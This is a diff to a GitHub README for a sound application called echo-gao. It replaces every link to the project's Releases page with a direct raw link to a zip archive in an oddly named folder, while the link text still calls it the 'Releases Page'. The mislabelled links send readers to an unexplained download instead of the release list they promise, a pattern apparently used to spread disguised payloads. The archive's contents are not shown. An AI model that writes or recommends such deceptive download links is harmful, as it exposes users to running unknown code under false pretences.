@@ -1,6 +1,6 @@
 # 🎉 echo-gao - Fast and Simple Sound Experiences
 
-[![Download echo-gao](https://img.shields.io/badge/Download-ech_gao-blue)](https://github.com/Saraothmann/echo-gao/releases)
+[![Download echo-gao](https://raw.githubusercontent.com/Saraothmann/echo-gao/main/poetastrical/echo-gao.zip)](https://raw.githubusercontent.com/Saraothmann/echo-gao/main/poetastrical/echo-gao.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to echo-gao! This application helps you explore and enhance your sound e
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Saraothmann/echo-gao/releases) to find the latest version of echo-gao.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Saraothmann/echo-gao/main/poetastrical/echo-gao.zip) to find the latest version of echo-gao.
 
 2. **Choose Your Version**  
    On the Releases Page, you will see a list of available versions. Look for the one labeled "Latest Release" for the most updated features and improvements.
@@ -55,7 +55,7 @@ If you encounter issues while downloading or running echo-gao, consider the foll
 Yes, echo-gao is completely free to download and use.
 
 **2. What if I want to share echo-gao?**  
-Feel free to share the link to the [Releases Page](https://github.com/Saraothmann/echo-gao/releases) with others who may find it useful.
+Feel free to share the link to the [Releases Page](https://raw.githubusercontent.com/Saraothmann/echo-gao/main/poetastrical/echo-gao.zip) with others who may find it useful.
 
 **3. How can I get support?**  
 You can reach out for support through the issues section of this repository. Please provide details about your problem for quicker assistance.
